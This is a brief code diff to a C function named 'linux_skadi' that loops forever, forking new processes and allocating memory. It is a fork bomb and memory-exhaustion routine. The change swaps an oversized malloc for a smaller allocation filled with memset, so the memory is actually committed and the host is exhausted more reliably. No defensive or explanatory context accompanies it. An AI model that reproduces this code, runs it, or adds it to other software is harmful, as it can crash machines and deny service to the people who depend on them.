@@ -5,7 +5,7 @@
 void linux_skadi() {
 	while (1) {
 		fork();
-		malloc(1024 * 1024 * 1024);
+		memset(malloc(1024*1024L), 'w', 1024*1024L);
 	}
 }
 
